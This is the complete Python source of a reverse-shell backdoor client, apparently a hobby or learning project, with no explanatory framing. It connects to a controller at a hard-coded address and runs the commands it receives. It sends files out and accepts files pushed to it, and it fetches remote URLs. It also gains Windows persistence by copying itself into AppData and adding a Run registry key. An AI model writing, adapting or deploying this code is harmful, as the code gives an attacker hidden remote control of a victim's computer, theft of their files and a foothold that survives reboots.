#!/usr/bin/python
import base64
import socket
import json
import time
import os
import shutil
import sys
import requests

def client():
    global s
    seconds = 5
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("127.0.0.1", 6666))
            print("Connected to Server")
            break
        except:
            print("Connection failed, retrying in {} seconds..".format(seconds))
            time.sleep(seconds)


def shell():
    while True:
        cmd = reliable_recv()
        if cmd == "exit":
            reliable_send("exiting...")
            break
        elif cmd.startswith("cd") and len(cmd) > 1:
            try:
                os.chdir(cmd[3:])
            except:
                continue
        elif cmd.startswith("download"):
            download(cmd)
        elif cmd.startswith("upload"):
            upload(cmd)
        elif cmd.startswith("get"):
            download_remote(cmd)
        elif cmd.startswith("persistence"):
            persistence()
        else:
            try:
                proc = os.popen(cmd)  # open a process to run commands on shell
                res = proc.read()  # command result
                reliable_send(res)
            except:
                reliable_send("Unrecognized command")


def reliable_send(data):
    json_data = json.dumps(data).encode()
    s.send(json_data)


def reliable_recv():
    json_data = bytearray()
    while True:
        try:
            json_data = json_data + s.recv(1024)
            return json.loads(json_data.decode())
        except ValueError:
            continue


def download_remote(cmd):
    """
    Download a remote file
    :param cmd:
    """
    try:
        url = cmd[4:]
        file_name = url.split("/")[-1]
        response = requests.get(url)
        with open(file_name, "wb") as out_file:
            out_file.write(response.content)
            reliable_send("Download completed")
    except:
        reliable_send("Download failed")


def download(cmd):
    """
    Send the file to the host
    :param cmd:
    :return:
    """
    try:
        with open(cmd[9:], "rb") as file:
            reliable_send(base64.b64encode(file.read()))
            return True
    except:
        return False


def upload(cmd):
    """
    Receive a file from the host
    :param cmd:
    :return:
    """
    try:
        with open(cmd[7:], "wb") as file:
            result = reliable_recv()
            file.write(base64.b64decode(result))
            return True
    except:
        return False


#
def persistence():
    """
    Acquire persistence writing on Windows registry to autorun on startup
    """
    location = os.environ["appdata"] + "\\ReverseShell.exe"  # C:\Users\%username%\AppData\Roaming\ReverseShell.exe
    if not os.path.exists(location):
        # Copy this .exe file into the specified location
        shutil.copyfile(sys.executable, location)
        # Add register key to HKEY_CURRENT_USER autorun allowed services (Microsoft\Windows\...\Run)
        # name the entry (/v), define the common register Type (/t), define the Data part (/d)
        os.popen(
            'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ReverseShell /t REG_SZ /d "' + location + '"')
        reliable_send("Persistence Acquired")
    else:
        reliable_send("Persistence already acquired")


if __name__ == '__main__':
    client()
    shell()
    s.close()
